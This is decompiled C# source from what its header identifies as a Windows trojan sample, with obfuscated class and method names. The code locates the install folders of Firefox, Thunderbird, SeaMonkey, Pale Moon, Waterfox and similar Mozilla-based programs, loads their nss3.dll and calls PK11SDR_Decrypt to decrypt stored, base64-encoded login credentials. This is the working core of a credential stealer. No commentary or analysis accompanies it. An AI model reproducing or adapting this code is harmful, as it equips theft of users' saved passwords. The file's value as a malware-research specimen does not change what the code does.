// Decompiled with JetBrains decompiler
// Type: ҭ뜸ÒҚӓ.鈟ŁBިܣ
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-871a0b2fa5664bd5ed819edb7c037b81b2b552e4ab9eec6f87adbf32d51365ef.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ҭ뜸ÒҚӓ
{
  [StandardModule]
  internal sealed class 鈟ŁBިܣ
  {
    private static IntPtr \uFFFD\uFFFD\u2964\uFFFD\uFFFD;
    public static List<IntPtr> \uFFFDεۨɮ츠 = new List<IntPtr>();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
    public static extern IntPtr ʤŔjی皍(string _param0);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr 鈇Ԝɢٵۨ(IntPtr _param0, string _param1);

    private static T 丐Цג\uFFFDʭ<T>(IntPtr _param0, string _param1)
    {
      int num1;
      T forFunctionPointer;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        forFunctionPointer = (T) Marshal.GetDelegateForFunctionPointer(鈟ŁBިܣ.鈇Ԝɢٵۨ(_param0, _param1), typeof (T));
        goto label_9;
label_5:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_9;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_5;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_9:
      if (num2 != 0)
        ProjectData.ClearProjectError();
      return forFunctionPointer;
    }

    public static long \u05C1\uFFFDܪ\u005Eޤ() => 鈟ŁBިܣ.丐Цג\uFFFDʭ<鈟ŁBިܣ.DLLFunctionDelegate6>(鈟ŁBިܣ.\uFFFD\uFFFD\u2964\uFFFD\uFFFD, "NSS_Shutdown")();

    [DllImport("kernel32.dll", EntryPoint = "FreeLibrary", SetLastError = true)]
    public static extern bool ﾭŲO\uFFFD\uFFFD(IntPtr _param0);

    public static long \u005E\uFFFD\uFFFDOų(string _param0)
    {
      string path1 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Thunderbird\\";
      string path2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Thunderbird\\";
      string path3 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
      string path4 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Firefox\\";
      string path5 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\SeaMonkey\\";
      string path6 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\SeaMonkey\\";
      string path7 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Comodo\\IceDragon\\";
      string path8 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Comodo\\IceDragon\\";
      string path9 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Cyberfox\\";
      string path10 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Cyberfox\\";
      string path11 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Pale Moon\\";
      string path12 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Pale Moon\\";
      string path13 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Waterfox Current\\";
      string path14 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Waterfox Current\\";
      string path15 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\SlimBrowser\\";
      string path16 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\SlimBrowser\\";
      string path17 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
      string path18 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Mozilla Firefox\\";
      string path19 = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Postbox\\";
      string path20 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Postbox\\";
      string str = (string) null;
      if (Directory.Exists(path1))
        str = path1;
      else if (Directory.Exists(path3))
        str = path3;
      else if (Directory.Exists(path2))
        str = path2;
      else if (Directory.Exists(path4))
        str = path4;
      else if (Directory.Exists(path5))
        str = path5;
      else if (Directory.Exists(path6))
        str = path6;
      else if (Directory.Exists(path7))
        str = path7;
      else if (Directory.Exists(path8))
        str = path8;
      else if (Directory.Exists(path9))
        str = path9;
      else if (Directory.Exists(path10))
        str = path10;
      else if (Directory.Exists(path12))
        str = path12;
      else if (Directory.Exists(path11))
        str = path11;
      else if (Directory.Exists(path13))
        str = path13;
      else if (Directory.Exists(path14))
        str = path14;
      else if (Directory.Exists(path15))
        str = path15;
      else if (Directory.Exists(path16))
        str = path16;
      else if (Directory.Exists(path17))
        str = path17;
      else if (Directory.Exists(path18))
        str = path18;
      else if (Directory.Exists(path19))
        str = path19;
      else if (Directory.Exists(path20))
        str = path20;
      鈟ŁBިܣ.\uFFFDεۨɮ츠.Add(鈟ŁBިܣ.ʤŔjی皍(str + "\\mozglue.dll"));
      鈟ŁBިܣ.\uFFFD\uFFFD\u2964\uFFFD\uFFFD = 鈟ŁBިܣ.ʤŔjی皍(str + "\\nss3.dll");
      鈟ŁBިܣ.\uFFFDεۨɮ츠.Add(鈟ŁBިܣ.\uFFFD\uFFFD\u2964\uFFFD\uFFFD);
      return 鈟ŁBިܣ.丐Цג\uFFFDʭ<鈟ŁBިܣ.DLLFunctionDelegate>(鈟ŁBިܣ.\uFFFD\uFFFD\u2964\uFFFD\uFFFD, "NSS_Init")(_param0);
    }

    public static string 丐\uFFFDşꓞی(string _param0)
    {
      IntPtr num = IntPtr.Zero;
      StringBuilder stringBuilder = new StringBuilder(_param0);
      string str;
      try
      {
        byte[] source = Convert.FromBase64String(_param0);
        num = Marshal.AllocHGlobal(source.Length);
        Marshal.Copy(source, 0, num, source.Length);
        鈟ŁBިܣ.TSECItem tsecItem = new 鈟ŁBިܣ.TSECItem();
        if (鈟ŁBިܣ.Қמéƌ\uFFFD(ref new 鈟ŁBިܣ.TSECItem()
        {
          SECItemType = 0,
          SECItemData = num,
          SECItemLen = source.Length
        }, ref tsecItem, 0) == 0)
        {
          if (tsecItem.SECItemLen != 0)
          {
            byte[] numArray = new byte[checked (tsecItem.SECItemLen - 1 + 1)];
            Marshal.Copy(tsecItem.SECItemData, numArray, 0, tsecItem.SECItemLen);
            str = Encoding.ASCII.GetString(numArray);
            goto label_9;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = (string) null;
        ProjectData.ClearProjectError();
        goto label_9;
      }
      finally
      {
        if (num != IntPtr.Zero)
          Marshal.FreeHGlobal(num);
      }
      str = (string) null;
label_9:
      return str;
    }

    public static int Қמéƌ\uFFFD(
      ref 鈟ŁBިܣ.TSECItem _param0,
      ref 鈟ŁBިܣ.TSECItem _param1,
      int _param2)
    {
      return ((鈟ŁBިܣ.DLLFunctionDelegate5) Marshal.GetDelegateForFunctionPointer(鈟ŁBިܣ.鈇Ԝɢٵۨ(鈟ŁBިܣ.\uFFFD\uFFFD\u2964\uFFFD\uFFFD, "PK11SDR_Decrypt"), typeof (鈟ŁBިܣ.DLLFunctionDelegate5)))(ref _param0, ref _param1, _param2);
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate long DLLFunctionDelegate6();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate(string configdir);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate4(
      IntPtr arenaOpt,
      IntPtr outItemOpt,
      StringBuilder inStr,
      int inLen);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate5(
      ref 鈟ŁBިܣ.TSECItem data,
      ref 鈟ŁBިܣ.TSECItem result,
      int cx);

    public struct TSECItem
    {
      public int SECItemType;
      public IntPtr SECItemData;
      public int SECItemLen;
    }
  }
}
